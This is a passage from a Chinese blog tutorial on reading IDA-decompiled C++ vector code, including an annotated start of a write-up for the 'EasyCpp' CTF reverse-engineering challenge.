返回v中位置为n的元素，后者更加安全</li><li>v.insert(pointer,number, content) 向v中pointer指向的位置插入number个content的内容。<br>还有v. insert(pointer, content)，v.insert(pointer,a[2],a[4])将a[2]到a[4]三个元素插入。</li><li>v.pop_back() 删除容器的末元素，并不返回该元素。</li><li>v.erase(pointer1,pointer2) 删除pointer1到pointer2中间（包括pointer1所指）的元素。<br>vector中删除一个元素后，此位置以后的元素都需要往前移动一个位置，虽然当前迭代器位置没有自动加1，<br>但是由于后续元素的顺次前移，也就相当于迭代器的自动指向下一个位置一样。</li><li>v1==v2 判断v1与v2是否相等。</li><li>！=、&lt;、&lt;=、&gt;、&gt;= 保持这些操作符惯有含义。</li><li>vector<typename>::iterator p=v1.begin( ); p初始值指向v1的第一个元素。*p取所指向元素的值。<br>对于const vector<typename>只能用vector<typename>::const_iterator类型的指针访问。</typename></typename></typename></li><li>p=v1.end( ); p指向v1的最后一个元素的下一位置。</li><li>v.clear() 删除容器中的所有元素。</li><li>v.resize(2<em>v.size)或v.resize(2</em>v.size, 99)　　 将v的容量翻倍(并把新元素的值初始化为99)</li></ol><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test;</span><br><span class="line">    <span class="comment">//创建一个vector，并且将5个数值压入容器</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)</span><br><span class="line">        test.push_back(i);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//输出容器大小</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; test.size();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除容器中最后的一个元素</span></span><br><span class="line">    test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判断容器是否为空，若非空，删除一个元素</span></span><br><span class="line">    <span class="keyword">if</span>(!test.empty())</span><br><span class="line">        test.pop_back();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重新设置容器大小并赋值</span></span><br><span class="line">    test.resize(<span class="number">5</span>, <span class="number">2</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建一个新容器，并判断新容器跟旧容器是否相等</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; test1(<span class="number">5</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(test1 == test)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"Right!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//将区间[first,last)的元素赋值到当前的vector容器中，或者赋n个值为x的元素到vector容器中，这个容器会清除掉vector容器中以前的内容</span></span><br><span class="line">    test1.assign(test.begin(), test.end());</span><br><span class="line">    getchar();</span><br><span class="line">    test.clear();</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是ida f5识别出来的代码，我相信很多新手看到这么多代码，已经开始晕了，不要紧，一步步给你分析下，我将每一步用getchar进行分割，方便你们看懂，你们自己调试的时候也可以这么做</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+54h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+5Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用上一节的知识，这里创建了一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v10, argv, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  <span class="comment">//这里相当于v10.push_back(i)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v10, &amp;i);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求v10的大小，相当于v3 = v10.size();</span></span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::size(&amp;v10);</span><br><span class="line">  <span class="comment">//相当于cout&lt;&lt;v3;</span></span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v3);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于v10.pop_back();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于if(!v10.empty())</span></span><br><span class="line">  <span class="comment">//        v10.pop_back();</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::empty(&amp;v10) ^ <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个resize有没有发觉很像上一节的构造函数，第一个参数为一个char变量的地址，第二个为容器初始大小，第三个为初始数据的地址</span></span><br><span class="line">  <span class="comment">//相当于v10.resize(5,2);</span></span><br><span class="line">  v11 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::resize(&amp;v10, <span class="number">5L</span>L, &amp;v11);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这里就是上一节的那个构造函数了，相当于vector&lt;int&gt;v9(5,2);</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v12);</span><br><span class="line">  v13 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v9, <span class="number">5L</span>L, &amp;v13, &amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v12);</span><br><span class="line">  <span class="comment">//这里判断两个容器是否相等,相当于v9 == v10</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>==&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v9, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Right!"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两句又出现了吧，end跟begin，这几句很常用，能识别就行</span></span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v10);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v10);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将下面句子简化可以看出他就是v9.assign(v6,v5);</span></span><br><span class="line">  <span class="comment">//其实就是v9.assign(v10.begin(), v10.end());</span></span><br><span class="line">  <span class="comment">//具体怎么简化的话，你就看::，不要看模板，那只是类型的问题</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::assign&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v9,</span><br><span class="line">    v6,</span><br><span class="line">    v5);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//清空容器元素，相当于v10.clear();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::clear(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//析构函数</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>小结：</strong></p><ul><li>c++ vector的逆向其实不难，最主要你要耐心去看，如果你看多几次，你会发觉这个不难，也就是基本操作而已</li><li>具体的重要步骤详解，我都在上面注释写的很清楚，一一对应，你可以根据getchar一个个对应去看，看多几遍就知道了</li><li>要学会简化ida识别的代码，不要盯着模板一直在那看</li></ul><p>好了，vector的基本操作完了，接下来拿一道题来实战吧。我相信各位的技术，接下来直接上代码你们也是可以看懂了，看不懂就往上面翻一翻，查下基本操作</p><h1 id="西湖论剑之EasyCpp"><a href="#西湖论剑之EasyCpp" class="headerlink" title="西湖论剑之EasyCpp"></a>西湖论剑之EasyCpp</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r15</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 r12_7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v18; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-190h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+90h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+F0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v30[<span class="number">18</span>]; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+158h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v20 = argv;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v23, argv, envp);<span class="comment">// #定义五个容器，相当于vector&lt;int&gt; v23,v24,v25,v26,v27</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v24, argv, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v25, argv, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v26, argv, v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v27, argv, v7);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v30[i], v20);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v24, &amp;v30[i]);<span class="comment">// 相当于v24.push_back(v30[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v29) = fib(j);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v23, &amp;v29);<span class="comment">// 相当于v23.push_back(fib(j)) ;   j从0-15</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v25, v30);<span class="comment">// 相当于v25.push_back(v30[0]);  </span></span><br><span class="line"></span><br><span class="line">  r12_7 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v25);<span class="comment">// back_inserter创建一个容器指针，指向v25</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);<span class="comment">// v8 = v24.end()</span></span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);<span class="comment">// v29 = v24.begin();</span></span><br><span class="line"></span><br><span class="line">  v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 4;这里我所说的这种说法有语法错误，因为v24.begin()是迭代器，不能这么加，我说的是地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Add(</span><br><span class="line">    v9,                                         <span class="comment">// v24.begin()+4 相当于数组第二个数</span></span><br><span class="line">    v8,                                         <span class="comment">// v24.end() 相当于数组最后一个数</span></span><br><span class="line">    r12_7,                                      <span class="comment">// 只有输入的第一个元素的容器</span></span><br><span class="line">    v30);                                       <span class="comment">// 输入的第一个元素的元素的值</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v28, v8, v11);<span class="comment">// 创建一个新容器 vector&lt;int&gt; v28</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v25);<span class="comment">// v12 = v25.end();</span></span><br><span class="line">  v13 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v25);<span class="comment">// v13 = v25.begin();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(</span><br><span class="line">    &amp;v29,</span><br><span class="line">    v13,</span><br><span class="line">    v12,</span><br><span class="line">    &amp;v28,</span><br><span class="line">    v14,</span><br><span class="line">    v15,</span><br><span class="line">    v3);                                        <span class="comment">// //倒置函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v26, &amp;v29);<span class="comment">//将容器v29赋值给v26</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v28);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v26, &amp;v23) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v27);</span><br><span class="line">  v16 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);</span><br><span class="line">  v17 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v17);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v16, v20);</span><br><span class="line">  v28 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v27);</span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v27);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v28, &amp;v29) )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v28);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *v18);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v28);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v24);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v23);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的注释部分只写到了获得正确flag的过程部分，也就是前半部分，后面部分其实也不难，你们可以作为练习分析下，<br>下面根据这里面的难点和重点进行具体分析，整个过程最难的部分就是Add和accumulate,这两部分是重点，如果不理解这两部分是无法得到正确的flag的</p><p>我先对Add附近的进行分析</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 1;</span></span><br></pre></td></tr></table></figure><p>这句我原来以为是将v29+1，后面才发觉这是取容器v29的第一个元素，如果这里看不懂的话，可以跟进去看看，双击这行</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(_QWORD *v24, __int64 num)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span 